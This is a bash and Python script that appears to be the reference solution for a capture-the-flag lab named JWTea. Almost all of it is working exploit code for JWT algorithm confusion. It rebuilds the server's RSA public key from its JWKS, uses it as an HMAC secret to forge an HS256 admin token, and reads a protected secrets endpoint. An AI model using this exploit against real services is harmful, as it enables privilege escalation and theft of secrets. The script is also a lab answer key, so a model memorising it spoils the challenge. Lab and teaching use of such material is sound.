#!/usr/bin/env bash
# ============================================================
# JWTea (labs03) — reference solution: JWT algorithm confusion
#
# Chain: register (RS256 token) -> fetch /.well-known/jwks.json ->
# rebuild the exact RSA public key PEM -> forge an HS256 token whose
# HMAC secret is that PEM and whose role claim is "admin" -> read
# /api/admin/treasury/secrets. (CVE-2015-9235 family.)
#
# Usage: ./run.sh [base-url]     (default http://localhost:8082)
# Prints the flag on stdout; exit 0 on success.
# Requires: python3 (stdlib only)
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8082}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

flag="$(python3 - "$BASE" <<'PYEOF'
import base64, hashlib, hmac, json, sys, time
import urllib.request

base = sys.argv[1]

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def b64u_json(obj):
    return b64u(json.dumps(obj, separators=(',', ':')).encode())

# --- 1. Register: get a legitimate RS256 token and learn our user id
user = 'hunter%d' % (int(time.time()) % 1000000)
reg = json.dumps({
    'username': user,
    'password': 'hunter123pass',
    'full_name': 'Hunter',
    'email': user + '@example.com',
}).encode()
req = urllib.request.Request(base + '/api/auth/register', data=reg,
                             headers={'Content-Type': 'application/json'})
with urllib.request.urlopen(req, timeout=10) as r:
    token = json.load(r)['token']
payload_b64 = token.split('.')[1]
claims = json.loads(base64.urlsafe_b64decode(payload_b64 + '==='))
my_id = claims['sub']
print('[*] registered %s (sub=%s, alg in issued token: see header)' % (user, my_id), file=sys.stderr)

# --- 2. Fetch the JWKS and rebuild the server's exact public key PEM
with urllib.request.urlopen(base + '/.well-known/jwks.json', timeout=10) as r:
    jwk = json.load(r)['keys'][0]

def der_len(n):
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b

def der_int(v):
    b = v.to_bytes((v.bit_length() + 7) // 8 or 1, 'big')
    if b[0] & 0x80:
        b = b'\x00' + b
    return b'\x02' + der_len(len(b)) + b

def der_seq(*parts):
    body = b''.join(parts)
    return b'\x30' + der_len(len(body)) + body

def b64u_dec(s):
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

n = int.from_bytes(b64u_dec(jwk['n']), 'big')
e = int.from_bytes(b64u_dec(jwk['e']), 'big')
rsa_pub = der_seq(der_int(n), der_int(e))
# SubjectPublicKeyInfo: SEQUENCE( AlgorithmIdentifier(rsaEncryption, NULL), BIT STRING(rsa_pub) )
spki = der_seq(
    der_seq(b'\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'),
    b'\x03' + der_len(len(rsa_pub) + 1) + b'\x00' + rsa_pub,
)
b64 = base64.b64encode(spki).decode()
pem = ('-----BEGIN PUBLIC KEY-----\n'
       + '\n'.join(b64[i:i + 64] for i in range(0, len(b64), 64))
       + '\n-----END PUBLIC KEY-----\n')
print('[*] rebuilt %d-byte public key PEM from JWKS' % len(pem.encode()), file=sys.stderr)

# --- 3. Forge an HS256 token: HMAC secret = public key PEM, role = admin
now = int(time.time())
header = b64u_json({'alg': 'HS256', 'typ': 'JWT'})
forged_claims = b64u_json({
    'iss': 'tahuna-auth',
    'aud': 'tahuna-app',
    'sub': my_id,               # our own user — the role claim does the escalation
    'role': 'admin',
    'username': user,
    'name': 'Hunter',
    'iat': now,
    'exp': now + 3600,
})
signing_input = (header + '.' + forged_claims).encode()
sig = hmac.new(pem.encode(), signing_input, hashlib.sha256).digest()
forged = header + '.' + forged_claims + '.' + b64u(sig)
print('[*] forged HS256 admin token, requesting treasury secrets', file=sys.stderr)

# --- 4. Read the flag
req = urllib.request.Request(base + '/api/admin/treasury/secrets',
                             headers={'Authorization': 'Bearer ' + forged})
with urllib.request.urlopen(req, timeout=10) as r:
    secrets = json.load(r)
flag = secrets.get('treasury_signature_key', '')
if not flag.startswith('FLAG{'):
    print('[-] unexpected treasury response: ' + json.dumps(secrets), file=sys.stderr)
    sys.exit(1)
print(flag)
PYEOF
)"

if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag extracted" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
